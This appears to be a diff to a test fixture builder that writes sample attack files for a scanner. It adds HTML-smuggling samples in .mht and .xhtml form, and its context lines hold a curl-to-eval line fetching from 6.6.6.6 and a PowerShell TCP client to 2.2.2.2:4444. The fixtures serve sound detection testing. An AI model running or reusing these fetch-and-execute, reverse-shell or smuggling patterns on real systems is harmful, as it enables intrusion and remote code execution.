@@ -244,6 +244,13 @@ def build_folder(root):
     w("smuggle.html", b"<html><script>var d=atob('XNlcg==');var b=new Blob([d],"
                        b"{type:'application/octet-stream'});var a=document.createElement('a');"
                        b"a.href=URL.createObjectURL(b);a.click();</script></html>")
+    w("smuggle.mht", b"MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary=x\r\n\r\n"
+                      b"--x\r\nContent-Type: text/html\r\n\r\n"
+                      b"<script>var d=atob('dGVzdA==');var b=new Blob([d]);"
+                      b"a.href=URL.createObjectURL(b);a.click();</script>\r\n--x--\r\n")
+    w("smuggle.xhtml", b"<?xml version=\"1.0\"?><html xmlns=\"http://www.w3.org/1999/xhtml\">"
+                        b"<script>var d=atob('dGVzdA==');var b=new Blob([d]);"
+                        b"a.href=URL.createObjectURL(b);a.click();</script></html>")
     w("pipe.sh", b"eval \"$(curl -fsSL http://6.6.6.6/x.sh)\"\n")
     w("tcpclient.ps1", b"$c = New-Object System.Net.Sockets.TcpClient('2.2.2.2', 4444)\n"
                         b"$s = $c.GetStream()\n")
